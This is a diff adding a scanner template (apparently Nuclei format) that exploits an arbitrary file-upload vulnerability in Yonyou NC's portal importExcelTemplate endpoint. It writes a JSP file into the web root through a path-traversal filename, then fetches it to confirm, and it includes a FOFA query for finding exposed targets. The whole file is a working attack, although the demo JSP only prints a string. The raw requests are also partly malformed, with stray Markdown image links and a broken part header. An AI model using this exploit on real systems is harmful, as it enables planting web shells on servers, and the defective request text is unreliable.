@@ -1,0 +1,49 @@
+id: poc-xetgggr9gzfwi3wx
+info:
+  name: 用友NC portal端importExcelTemplate存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xetgggr9gzfwi3wx'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xetgggr9gzfwi3wx
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /portal/pt/infopathimport/importExcelTemplate?pageId=login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNAL3EsrdN90G1hgq
+
+
+    ------WebKitFormBoundaryNAL3EsrdN90G1hgq
+
+    Content-Disposition: form-data; name="Filedata"; filename="./.\webapps\nc_web\2.jsp"
+
+    application/octet-stream
+
+
+    <% out.println("HelloWorld");%>
+
+    ------WebKitFormBoundaryNAL3EsrdN90G1hgq--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755944206645-b08fc982-7cde-4ad7-990b-6c38c34dc368.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /2.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755944206816-1ef0d32c-8f27-4f96-bcf6-42d5a00ebd5c.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
